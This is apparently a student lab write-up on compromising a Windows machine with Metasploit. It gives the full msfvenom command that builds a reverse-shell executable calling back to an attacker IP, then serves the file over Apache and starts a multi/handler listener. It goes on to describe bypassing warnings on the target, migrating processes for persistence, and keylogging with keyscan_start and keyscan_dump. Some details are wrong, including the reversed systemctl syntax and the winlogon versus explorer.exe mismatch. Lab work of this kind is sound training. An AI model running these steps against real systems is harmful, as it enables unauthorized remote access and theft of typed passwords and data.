# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
![Screenshot 2025-04-07 111203](https://github.com/user-attachments/assets/f502fbad-fa63-43b0-a764-bd5d668829f0)






Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![Screenshot 2025-04-07 111219](https://github.com/user-attachments/assets/e0bb5eb9-e3ee-44da-9b23-6b8f35ef0d1a)







copy the fun.exe into the apache /var/www/html folder
![Screenshot 2025-04-07 111421](https://github.com/user-attachments/assets/4ddc6822-5ea4-474d-9585-8a06ac09cfa0)



Start apache server
sudo systemctl apache2 start
![Screenshot 2025-04-07 111543](https://github.com/user-attachments/assets/8ce9e844-c444-426e-ae16-034af3cd6e5b)






Check the status of apache2
![Screenshot 2025-04-07 112128](https://github.com/user-attachments/assets/e3317be1-ef42-4cd9-90e0-8c04e27e7318)





Invoke msfconsole:
## OUTPUT:
![Uploading Screenshot 2025-04-07 114636.png…]()





Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
![Screenshot 2025-04-07 115214](https://github.com/user-attachments/assets/ea384ca5-6c96-405e-9b45-b23f4e9fab41)




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![Screenshot 2025-04-07 115416](https://github.com/user-attachments/assets/c77d859f-ec36-4ce5-a9d5-e54633f390c7)



Bypass any warning boxes, double-click the file, and allow it to run.


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![Screenshot 2025-04-07 115242](https://github.com/user-attachments/assets/13ef9689-8a76-4d7c-bb44-0e4ee9807099)




Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![{F7D2ED4C-13F1-4F4C-B951-BEB85E88527E}](https://github.com/user-attachments/assets/337f3a58-b9d7-413a-9619-eaa764b32dd9)



keyscan_dump	Shows the keystrokes captured so far
![Screenshot 2025-04-07 115015](https://github.com/user-attachments/assets/2cd42810-8016-4632-97ca-6ab56f11c012)





## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
